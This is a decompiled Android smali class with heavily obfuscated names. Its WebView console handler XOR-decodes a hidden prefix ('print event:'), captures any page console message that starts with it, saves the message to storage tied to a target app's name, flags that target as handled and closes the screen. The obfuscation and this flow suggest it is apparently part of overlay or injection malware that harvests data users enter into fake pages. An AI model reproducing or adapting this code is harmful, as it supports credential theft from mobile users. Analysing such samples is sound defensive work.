.class public Lcom/vknnolqo/p9sv5zvf/JB4M6sys$b;
.super Landroid/webkit/WebChromeClient;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/vknnolqo/p9sv5zvf/JB4M6sys;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "b"
.end annotation


# instance fields
.field final synthetic a:Lcom/vknnolqo/p9sv5zvf/JB4M6sys;


# direct methods
.method public constructor <init>(Lcom/vknnolqo/p9sv5zvf/JB4M6sys;)V
    .locals 0

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys$b;->a:Lcom/vknnolqo/p9sv5zvf/JB4M6sys;

    invoke-direct {p0}, Landroid/webkit/WebChromeClient;-><init>()V

    return-void
.end method


# virtual methods
.method public onConsoleMessage(Landroid/webkit/ConsoleMessage;)Z
    .locals 5

    invoke-virtual {p1}, Landroid/webkit/ConsoleMessage;->message()Ljava/lang/String;

    move-result-object p1

    const/16 v0, 0xc

    const/4 v1, 0x1

    const/16 v2, 0x8

    :try_start_0
    new-array v0, v0, [B

    fill-array-data v0, :array_0

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys$b;->a:Lcom/vknnolqo/p9sv5zvf/JB4M6sys;

    iget-object v3, v0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->c:Ljava/lang/String;

    sput-object v3, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->X:Ljava/lang/String;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->d:Landroid/content/Context;

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->r(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v3, Ljava/io/File;

    iget-object v4, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys$b;->a:Lcom/vknnolqo/p9sv5zvf/JB4M6sys;

    invoke-virtual {v4}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v4

    invoke-direct {v3, v4, v0}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v0

    iget-object v3, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys$b;->a:Lcom/vknnolqo/p9sv5zvf/JB4M6sys;

    iget-object v4, v3, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->d:Landroid/content/Context;

    iget-object v3, v3, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->c:Ljava/lang/String;

    invoke-static {v4, v3, p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/z4;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    sget-object p1, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->e:Ljava/util/Map;

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys$b;->a:Lcom/vknnolqo/p9sv5zvf/JB4M6sys;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->c:Ljava/lang/String;

    sget-object v3, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-interface {p1, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys$b;->a:Lcom/vknnolqo/p9sv5zvf/JB4M6sys;

    invoke-static {p1, v1}, Lcom/vknnolqo/p9sv5zvf/JB4M6sys;->a(Lcom/vknnolqo/p9sv5zvf/JB4M6sys;Z)Z

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/JB4M6sys$b;->a:Lcom/vknnolqo/p9sv5zvf/JB4M6sys;

    invoke-virtual {p1}, Landroid/app/Activity;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const/16 p1, 0x9

    new-array p1, p1, [B

    fill-array-data p1, :array_2

    new-array v0, v2, [B

    fill-array-data v0, :array_3

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    const/16 p1, 0x16

    new-array p1, p1, [B

    fill-array-data p1, :array_4

    new-array v0, v2, [B

    fill-array-data v0, :array_5

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    :cond_0
    :goto_0
    return v1

    :array_0
    .array-data 1
        0x4ft
        0x3et
        0x14t
        0x20t
        0x42t
        -0x29t
        0x25t
        0x4ft
        0x5at
        0x22t
        0x9t
        0x74t
    .end array-data

    :array_1
    .array-data 1
        0x3ft
        0x4ct
        0x7dt
        0x4et
        0x36t
        -0x9t
        0x40t
        0x39t
    .end array-data

    :array_2
    .array-data 1
        0x55t
        -0x55t
        0x5et
        -0x7t
        0x72t
        0x20t
        0x7ct
        -0x41t
        0x70t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x2t
        -0x32t
        0x3ct
        -0x6dt
        0x17t
        0x43t
        0x8t
        -0x30t
    .end array-data

    :array_4
    .array-data 1
        -0x2ct
        0x6at
        -0x59t
        0xet
        -0x6dt
        -0x20t
        0x15t
        0x5at
        -0x22t
        0x49t
        -0x7ft
        0x12t
        -0x72t
        -0xet
        0x1dt
        0x53t
        -0x65t
        0x61t
        -0x6at
        0x13t
        -0x6et
        -0x1ft
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x45t
        0x4t
        -0x1ct
        0x61t
        -0x3t
        -0x6dt
        0x7at
        0x36t
    .end array-data
.end method
